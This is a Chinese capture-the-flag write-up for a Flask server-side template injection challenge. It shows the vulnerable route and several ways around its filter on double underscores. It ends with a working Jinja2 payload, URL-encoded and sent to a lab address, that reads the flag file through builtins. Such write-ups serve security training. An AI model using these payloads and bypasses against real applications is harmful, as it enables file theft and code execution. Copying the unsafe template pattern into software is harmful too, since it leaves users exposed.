## Normal | baby_ssti | Author: CrzZ

打开网页，看到一串编码，放进CyberChef解Base64得到源码

分析重点函数：

```python
def checkSSTI(s):
    if '__' in s:
        return False
    return True

@app.route('/<uname>')
def hello(uname):
    if checkSSTI(uname):
        html = f"""
        <h1>Hello {uname}, welcome to my website!</h1>
        """
        if uname=="Flask":
            with open(__file__,'rb') as f:
                html+=f"""
                <code>{base64.b64encode(f.read()).decode()}</code>
                """
    else:
        html = f"""
        <h1>Don't do that! BAD HACKER!!!</h1>
        """
    return render_template_string(html)
```

阅读[flask之ssti模版注入从零到入门 - 先知社区 (aliyun.com)](https://xz.aliyun.com/t/3679)了解SSTI

搜索`Flask` `SSTI` `RCE` `Payload` `绕过` 来抄Payload

这里直接提供一个网站 [SSTI详解 一文了解SSTI和所有常见payload 以flask模板为例_闵行小鱼塘-CSDN博客](https://blog.csdn.net/weixin_44604541/article/details/109048578)

下面提供我的Payload和一些绕过方法（不全，其它的可以自己了解并尝试

- 方法一：用十六进制`'\x5f\x5f'`代替`'__'`

- 方法二：用八进制'`\137\137'`代替`'__‘`
- 方法三：用`'_'*2`代替`'__'`
- 方法四：使用request传参来绕过

```jinja2
{{url_for['\x5f\x5fglobals\x5f\x5f']['\x5f\x5fbuiltins\x5f\x5f']['open']('flag').read()}}
```

urlencode之后：

```
%7B%7Burl_for%5B'%5Cx5f%5Cx5fglobals%5Cx5f%5Cx5f'%5D%5B'%5Cx5f%5Cx5fbuiltins%5Cx5f%5Cx5f'%5D%5B'open'%5D('flag').read()%7D%7D
```

最终访问url：

```
http://111.231.101.223:32768/%7B%7Burl_for%5B'%5Cx5f%5Cx5fglobals%5Cx5f%5Cx5f'%5D%5B'%5Cx5f%5Cx5fbuiltins%5Cx5f%5Cx5f'%5D%5B'open'%5D('flag').read()%7D%7D
```

> `Kap0k{5571_Is_re411y_e4sy~~}`